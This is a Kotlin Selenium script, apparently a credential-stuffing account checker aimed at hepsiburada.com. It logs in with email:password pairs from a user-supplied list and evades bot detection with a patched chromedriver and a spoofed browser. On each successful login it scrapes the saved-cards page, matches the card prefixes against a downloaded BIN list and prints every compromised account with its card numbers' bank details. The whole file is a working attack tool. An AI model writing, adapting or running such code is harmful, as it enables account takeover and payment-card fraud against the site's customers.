package tr.groax

import com.google.common.io.Files
import org.apache.commons.io.output.NullPrintStream
import org.jsoup.Jsoup
import org.jsoup.nodes.Document
import org.jsoup.select.Elements
import org.openqa.selenium.By
import org.openqa.selenium.WebDriver
import org.openqa.selenium.WebElement
import org.openqa.selenium.chrome.ChromeDriver
import org.openqa.selenium.chrome.ChromeOptions
import org.openqa.selenium.support.ui.ExpectedConditions
import org.openqa.selenium.support.ui.WebDriverWait
import java.io.BufferedReader
import java.io.File
import java.io.InputStreamReader
import java.net.URL
import java.time.Duration
import java.util.*
import java.util.concurrent.TimeUnit
import java.util.stream.Collectors
import javax.swing.JFileChooser
import javax.swing.JFrame
import javax.swing.filechooser.FileSystemView
import kotlin.text.Charsets.UTF_8

//Eger arkaplanda calismasini istiyorsaniz true yapin.
val SILENT_BROWSER = false

fun main() {
    var pathStr = "empty"

    val choose = JFileChooser(FileSystemView.getFileSystemView().homeDirectory)
    val frame = JFrame()

    frame.setAlwaysOnTop(true)
    choose.isVisible = true
    choose.setDialogTitle("Select file (*.txt only)")
    choose.setFileSelectionMode(JFileChooser.FILES_ONLY)
    choose.setAcceptAllFileFilterUsed(false)

    if (choose.showOpenDialog(frame) == JFileChooser.APPROVE_OPTION) {
        pathStr = choose.selectedFile.absolutePath
    }

    if (!pathStr.endsWith(".txt")) {
        println("[-] Wrong file type!")
        return
    }


    val binList = binList()
    val accounts = Files.readLines(File(pathStr), UTF_8)
    System.setErr(NullPrintStream())
    System.setProperty("webdriver.chrome.driver", "chromedriver_PATCHED.exe")
    while (true) {
        val driver: WebDriver = webDriver
        driver.manage().window().maximize()
        driver.manage().deleteAllCookies()
        driver.manage().timeouts().pageLoadTimeout(10, TimeUnit.SECONDS)
        driver.manage().timeouts().implicitlyWait(5, TimeUnit.SECONDS)
        try {
            val account = accounts[Random().nextInt(accounts.size)]
            driver.get("https://giris.hepsiburada.com/")
            driver.findElement(By.xpath("//*[@id=\"txtUserName\"]"))
                .sendKeys(account.split(":".toRegex()).dropLastWhile { it.isEmpty() }
                    .toTypedArray()[0])
            Thread.sleep(200)
            driver.findElement(By.xpath("//*[@id=\"btnLogin\"]")).click()
            val element: WebElement = WebDriverWait(
                driver,
                Duration.ofSeconds(2)
            ).until(ExpectedConditions.presenceOfElementLocated(By.xpath("//*[@id=\"txtPassword\"]")))
            element.sendKeys(account.split(":".toRegex()).dropLastWhile { it.isEmpty() }.toTypedArray()[1])
            driver.findElement(By.xpath("//*[@id=\"btnEmailSelect\"]")).click()
            Thread.sleep(500)
            try {
                driver.findElement(By.xpath("//*[@id=\"root\"]/div/div/div[1]/div[2]/div/div/div[4]/div/div/div[1]/div[2]"))
            } catch (ignore: Exception) {
                driver.get("https://www.hepsiburada.com/hesabim/kayitli-kartlarim")
                val table: WebElement = driver.findElement(By.cssSelector(".MainContainer__Content___2g-rO"))
                val doc: Document = Jsoup.parse(table.getAttribute("innerHTML"))
                val cards: Elements =
                    doc.getElementsByClass("CardBox__CardBox___10rKq CardBox__LoyaltyCardBox___3em8C")
                val bins: MutableList<String> = ArrayList()
                for (card in cards) {
                    for (binLine in binList.split("\n".toRegex()).dropLastWhile { it.isEmpty() }.toTypedArray()) {
                        if (binLine.startsWith(
                                card.getElementsByClass("utils__CardFormatter___1oXPc").text().substring(0, 7)
                                    .replace(" ", "")
                            )
                        ) {
                            bins.add(
                                card.getElementsByClass("utils__CardFormatter___1oXPc")
                                    .text() + " | " + binLine.substring(7)
                                    .substring(binLine.substring(7).indexOf(",") + 1).replace(",", " ")
                                    .replace(".", "")
                            )
                            break
                        }
                    }
                }
                if (bins.isNotEmpty()) {
                    println("<----> $account <---->")
                    println("\t Cards:")
                    for (bin in bins) {
                        println("\t\t" + bin)
                    }
                    System.out.printf(
                        "<----> %s <---->%n",
                        "\t".repeat(("<----> $account <---->".length - account.length) / 2)
                    )
                }
            }
        } catch (e: Exception) {
            e.printStackTrace()
        } finally {
            driver.quit()
        }
    }
}

private fun binList(): String {
    val url =
        URL("https://gist.githubusercontent.com/berkayunal/1595676/raw/debaa41dfd85d57b7681bcc46341f9bc0fa55682/Kredi%2520Kart%25C4%25B1%2520BIN%2520Listesi%2520-%2520CSV")
    return BufferedReader(InputStreamReader(url.openStream())).lines().collect(Collectors.joining("\n"))
}

private val webDriver: WebDriver
    get() {
        val chromeOptions = ChromeOptions()
        chromeOptions.addArguments("--no-sandbox")
        if(SILENT_BROWSER) {
            chromeOptions.addArguments("--headless=new")
        }
        chromeOptions.addArguments("--disable-blink-features=AutomationControlled")
        chromeOptions.addArguments("window-size=1920,1080")
        chromeOptions.addArguments("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36")
        chromeOptions.addArguments("disable-infobars")
        chromeOptions.addArguments("excludeSwitches=enable-automation")
        return ChromeDriver(chromeOptions)
    }
